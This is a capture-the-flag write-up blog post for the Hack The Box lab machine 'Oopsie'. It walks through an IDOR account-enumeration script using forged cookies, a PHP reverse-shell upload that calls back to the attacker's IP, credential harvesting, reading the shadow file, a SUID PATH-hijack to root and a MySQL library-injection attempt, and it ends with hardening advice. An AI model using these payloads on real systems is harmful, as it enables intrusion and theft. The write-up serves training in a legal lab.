## HTB Starting Point: Oopsie

`Oopsie` is a 2nd box from Starting Point path on [Hack The Box](https://app.hackthebox.eu/). This path is composed of 9 boxes in a way that later boxes use information (like credentials) gathered from the previous ones.

This box features debugging session and MySQL enumeration.

***
# Contents

1. [Basic Information](#basic-information)
2. [Target of Evaluation](#target-of-evaluation)
3. [Recon](#recon)
4. [Website (:80)](#website-80)
5. [Exploiting (user shell)](#exploiting-user-shell)
6. [Lateral movement](#lateral-movement)
7. [Escalating Privileges](#escalating-privileges)
8. [Post-exploitation](#post-exploitation)
9. [Hardening Ideas](#hardening-ideas)
10. [Additional readings](#additional-readings)
***

# Basic Information

| #     |   |
|:--    |:--|
| Type    |Starting Point
|Name    | **	Hack The Box / Oopsie**
|Pwned| 2021/05/30
|URLs    | https://app.hackthebox.eu/machines/288
|Author  | **Asentinn** / OkabeRintaro
|       | [https://ctftime.org/team/152207](https://ctftime.org/team/152207)

%%[patreon-btn]

# Target of Evaluation

Setting shell variable `IP=10.10.10.28`

[Back to top](#contents) ⤴

# Recon

```sh
$ nmap -sV -sC -p- $IP -oN nmap-$IP.out
```

![5242615545503.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359515995/BmPzbPIQE.png)

```
whatweb $IP > whatweb.out
```

![3817402756411.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359527961/sKujCK-tC.png)

We can remember that possible user is `admin`.

```sh
$ gobuster dir -w /usr/wl/dirbuster-m.txt -x txt,php -u http://$1 -o gbdir-$1-http.out
```

![2579806462988.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359551998/F1r9nkKzw.png)

```sh
$ curl -X OPTIONS -I http://$IP/uploads/
```

![5710042871254.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359598952/j7ebw12ok.png)

```sh
$ nikto -h $IP
```

![5533718588824.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359628559/ZfCK5GTbo.png)

[Back to top](#contents) ⤴

# Website (:80)

![3254609819658.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359800980/jdk3ZSWZW.png)

At the bottom of the page we see that it should have some login front.

![2472539506300.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359817919/Am9HmkO-2.png)

By looking at the a source code we can find where the login page is located (also we can see that in the `nikto` output):

![908940052778.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359831242/Jv6crvP9e.png)

## `/cdn-cgi/login/`

![5109588867122.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624359847886/GhsDCS7I8.png)

Here, in the source code, apart from the following JS script we don't see anything useful.
![4759601737308.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364874715/Q1Qn91i2X.png)

Ok, now that we don't have any clues about credentials we can use - but let's try some of these from the [Archetype](/htb-starting-point-archetype) box.

`admin/MEGACORP_4dm1n!!` is the answer.

![1054904841448.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364889827/5Twexim-r.png)

On the top navigation bar there is an `Upload` page - this is something we should check right away for possible reverse shell uploads.

## `/cdn-cgi/login/admin.php?content=uploads`

![558202605415.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364913275/lb2_8hCNo.png)

That's an interesting one. We come back here after we enumerate users

## `/cdn-cgi/login/admin.php?content=accounts&id=1`

![1095069701766.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364925916/szOTLgtDO.png)

Using the Developer Tools (F12) we can peek the request and cookies:

![2626903306530.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364935593/iYSZPxsvR.png)

Let's enumerate the `id` query parameter to discover some users.

```py
# account_enum.py

import requests
import urllib3
import re
from tabulate import tabulate

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

host = "10.10.10.28"
url = f"http://{host}/cdn-cgi/login/admin.php?content=accounts&id="

headers = {}
cookies = {"user":"34322", "role":"admin"}

t_header = ["ID", "Name", "Email"]
t_matches = []

re_pattern = "<table><tr><th>Access ID</th><th>Name</th><th>Email</th></tr><tr><td>(?P<ID>.+)</td><td>(?P<Name>.+)</td><td>(?P<Email>.+)</td></tr></table"

for i in range(100):
    r = requests.get(f"{url}{i}", cookies=cookies, headers=headers, verify=False)

    match = re.search(re_pattern, r.text)

    if match != None:
        t_matches.append([match["ID"], match["Name"], match["Email"]])

print(tabulate(t_matches, t_header))
```

> Play with this regex [here](https://regex101.com/r/dNJew0/1).

![2874780499364.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364950772/ycUiVDp9y.png)

Ok, so when we replace the cookies with `super admin` account details, we should be able to see the `Uploads` page.

![5332291816323.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364965952/0cXR4ZlM0.png)

Voila!

![2561109258800.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624364977154/Mxy5paAMp.png)

[Back to top](#contents) ⤴

# Exploiting (user shell)

First, we can try the simplest payload:

```php
# pshell.php

<?php
$sock=fsockopen("10.10.XX.XXX",4445);
$proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

![1921633931166.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365280394/-TBb8QrQq.png)

Let's see `curl http://10.10.10.28/uploads/pshell.php`

Yup, reverse shell obtained.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1624367279700/hPnhkisKM.png)

Semi stabilizing shell and alias

```
$ alias ls='ls --color=always -lAh'
$ python3 -c "import pty;pty.spawn('/bin/bash')"
```

Some more interesting findings:

![75148064956.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365008922/cVsC454CR.png)

![236932727586.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365024818/_zaAS_mcs.png)

Another credential to add.

```
$ echo 'robert|M3g4C0rpUs3r!' | tee -a ../.credentials
robert|M3g4C0rpUs3r!

$ cat ../.credentials

sql_svc|M3g4c0rp123
administrator|MEGACORP_4dm1n!!
robert|M3g4C0rpUs3r!

```

Search for user flag:

![1223491098411.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365046093/AgVpMnLxk.png)

[Back to top](#contents) ⤴

# Lateral movement

Now we can try to reuse DB credentials to switch shell user.

![2039414698440.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365081579/CG4xhCjrd.png)

Check for sudo rights
![42831952712.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365089589/2zlayxBKy.png)


## `bugtracker` group

This group is not a standard one. We should be curious about such creations. By using `find` command, we can easily track down all files to which group have special permissions to.

```sh
find / -group bugtracker 2>/dev/null
```

![2070396192989.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365099494/cCAKRJWIK.png)

Interesting. It looks like some custom application. Lets `strace` it.

```
$ strace bugtracker
```

![4200016117802.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365117358/gNCyZ7ReC.png)

It is waiting for the input - type anything and hit enter. Later down the stack, we see that application permissions are temporarily elevated to the root permissions
![4973533837197.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365133849/6GSgTqfHc.png)

And following path is `cat` out.

![686007484704.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365143886/JCf-UyJoC.png)

It is even better visible by using `ltrace`
![3389142210754.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365157248/2eU3vAADGz.png)

> New to `strace` and `ltrace`? Check my other write-up: [Passphrase](/cyber-apocalypse-2021-passphrase)

Application is trying to cat the file out. Using directory traversal, we can read the shadow file.

```
robert@oopsie:/var/www/html/uploads$ bugtracker
```

![3058473057245.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365171297/KkxVY24ck.png)

And try to crack `root` password it with `john`:

```
$ unshadow passwd.txt shadow.txt > unshadowed.txt
$ john --wordlist=/usr/wl/rockyou.txt unshadowed.txt

Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:53:11 DONE (2021-05-30 15:45) 0g/s 4493p/s 4493c/s 4493C/s !!!playboy!!!7..*7¡Vamos!
Session completed

```

But we can't crack it. At this point, we can simply cat out the root flag

![5787352694397.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365183455/t7okXooRh.png)

But let's assume we don't know where the flag lays.

[Back to top](#contents) ⤴

# Escalating Privileges

> 🔔 `CyberEthical.Me` is maintained purely from your donations - if you would like to boost the community, consider one-time sponsoring on the [Sponsor](/sponsor) button or [become a Patron](https://www.patreon.com/bePatron?u=57522747) which also gives you some bonus perks.

In the debugging sessions, we see that `cat` is not referenced via an absolute `/bin/cat` path. We can exploit that.
The plan is to modify `PATH` variable to include directory, so it will be searched **before** `/bin/`. In this directory, we are going to create `cat` file that will call `/bin/bash`. As we've observed before, `cat` (whatever it may be) is run with temporary elevated privileges - that way we can get the root shell.

```
export PATH=/tmp:$PATH
cd /tmp/
echo '/bin/sh' > cat
chmod +x cat
```

![5171782624492.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365197956/aO8bq7lYB.png)

That way, we have a `cat` executable file that will be called inside `bugtracker` instead `/bin/cat`.
![241768606964.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365212772/522mfcLCe.png)

![5116127633069.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365221444/Kv95Zqvyi.png)

Remember that because we have modified `cat` in a `PATH` we should, either unset the `/tmp:` or call `cat` via its absolute path.

![3645601596404.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365229424/Bh74Z4Rlf.png)

[Back to top](#contents) ⤴

# Post-exploitation

When you read the reports in the `/root/reports` you will see many references to the `filezilla` and its config. It happens that `.config` directory actually exists in the `/root`

![817353914711.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365239164/y83wv9QVX.png)

Alright - another credential to save.

```
echo 'ftpuser|mc@F1l3ZilL4' | tee -a ../.credentials
```

## MySQL

Let's see what we can get by using `robert` account with `mysql`.

![129463566212.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365248899/2dhqCl_8I.png)

```
mysql> use garage;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| garage             |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> show tables;
+------------------+
| Tables_in_garage |
+------------------+
| accounts         |
| branding         |
| clients          |
+------------------+
3 rows in set (0.00 sec)

```

Let's grab password hashes and check it on [CrackStation](https://crackstation.net/).

```
mysql> select user,authentication_string from mysql.user;
+------------------+-------------------------------------------+
| user             | authentication_string                     |
+------------------+-------------------------------------------+
| root             |                                           |
| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| debian-sys-maint | *D1DBADEE9E3EE2D0767B40F19463FB6C5EB6D594 |
| dbuser           | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 |
| robert           | *2429DD64CD7A63687EA257432557FEFDA6D6F2A1 |
+------------------+-------------------------------------------+
6 rows in set (0.00 sec)

```

![4079019178801.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1624365261937/7ZX_16y7I.png)

```
echo 'dbuser|toor' | tee -a ../.credentials
```

## Arbitrary Library Injection (rabbit hole?)

* [Super_priv](https://dev.mysql.com/doc/refman/5.6/en/privileges-provided.html#priv_super)

This exploit is abusing user privileges to INSERT and DELETE on 'mysql'
administrative database, so it is possible to use a library located in an arbitrary
directory. We can use it to prepare a library with `do_system` function to execute shell commands with root privileges.

> For more detailed steps, please refer to [MySQL Arbitrary Library Injection @ Wisec.It](http://www.wisec.it/vulns.php?page=5).

For a quick wrap up - I did manage to upload the library payload and add its path to `mysql.func` table. 

```
INSERT INTO mysql.func (name,dl) VALUES ('do_system','/var/lib/mysql-files/lib_mysqludf_sys.so');
```

The last step was restarting the MySQL server - which I could have done on user account partially. Following will shut down the MySQL...

```
CREATE FUNCTION exit RETURNS INTEGER SONAME 'libc.so.6';
SELECT exit(0);
```

... but I didn't find a way to start it again. Maybe it is not possible?

[Back to top](#contents) ⤴

# Hardening Ideas

## Use absolute paths to the binaries

Using relative paths, you are creating a vulnerability that could potentially lead to executing malicious code and in the worst scenario cause privilege escalation.

## Principle of Least Privilege

On this MySQL instance, too many accounts have Priv_system permissions. Always start from the least privileged permission and add more of them as needed.

## Don't reuse passwords

This advice probably is applicable to all Starting Point boxes, as they are created such intentionally - but it's good to spotlight it.

> Like what you see? Join the [Hashnode.com](/join) now. Things that are awesome:

>✔ Automatic GitHub Backup

>✔ Write in Markdown

>✔ Free domain mapping

>✔ CDN hosted images

>✔ Free in-built newsletter service

> By using my link you can help me unlock the ambasador role, which cost you nothing and gives me some additional features to support my content creation mojo.

[Back to top](#contents) ⤴

# Additional readings

> 📌 Follow the `#CyberEthical` hashtag on the social media

> 👉 Instagram: [@cyber.ethical.me](https://www.instagram.com/cyber.ethical.me/)

> 👉 LinkedIn: [Kamil Gierach-Pacanek](https://www.linkedin.com/in/kamilpacanek)

> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)

> 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)

* [Hijacking Relative Paths in SUID Programs](https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e)
* [Linux Privilege Escalation Using PATH Variable](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
* [Principle of Least Privilege](https://us-cert.cisa.gov/bsi/articles/knowledge/principles/least-privilege#:~:text=The%20Principle%20of%20Least%20Privilege%20states%20that%20a%20subject%20should,control%20the%20assignment%20of%20rights.)

[Back to top](#contents) ⤴

#### Check other write-ups from the Starting Point path - links below the article, or navigate directly to the series [here](/series/htb-starting-point).